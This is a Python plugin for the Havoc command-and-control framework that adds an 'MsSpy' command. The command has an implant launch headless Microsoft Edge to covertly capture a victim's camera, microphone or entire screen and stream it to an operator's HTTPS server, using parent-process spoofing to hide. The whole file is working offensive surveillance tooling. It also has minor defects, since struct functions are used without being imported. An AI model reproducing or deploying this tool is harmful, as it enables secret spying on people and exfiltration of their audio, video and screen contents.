from havoc import Demon, RegisterCommand
from os.path import exists

class Packer:
    def __init__(self):
        self.buffer: bytes = b''
        self.size: int = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s) + 1, s)
        self.size += calcsize(fmt)

    def addint(self, dint):
        self.buffer += pack("<i", dint)
        self.size += 4



def MsSpy(demonID, *args):
    TaskID : str    = None
    demon  : Demon  = None
    packer: Packer = Packer()
    string: str = None
    int32: int = 0

    demon  = Demon(demonID)

    if len(args) != 3:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    mode = args[0]
    server = args[1]
    ppid = int(args[2])

    if not server.startswith("https://"):
        server = "https://" + server


    match mode:
        case "camera":
            packer.addstr("\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --headless --auto-accept-camera-and-microphone-capture " + server)
        case "audio":
            packer.addstr("\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --headless --auto-accept-camera-and-microphone-capture " + server)
        case "screen":
            packer.addstr("\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --headless --auto-select-desktop-capture-source=Entire --window-size=1280,720 " + server)
        case _:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, "Invalid input, accepted values: [video|audio|screen]")
            return False
    
    packer.addint(ppid)



    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon to spawn msedge to spy on victim")
    
    demon.InlineExecute(TaskID, "go", "/home/kali/Havoc/client/Modules/MsSpy/ObjectFiles/msspy.o", packer.getbuffer(), False)

    return TaskID

RegisterCommand(MsSpy, "", "MsSpy", "Use msedge.exe to spy on the target", 0, "MsSpy [camera|audio|screen] [https server] [PID for PPID spoofing]", "MsSpy screen https://anthegreekgod.ant/video.html 6192")
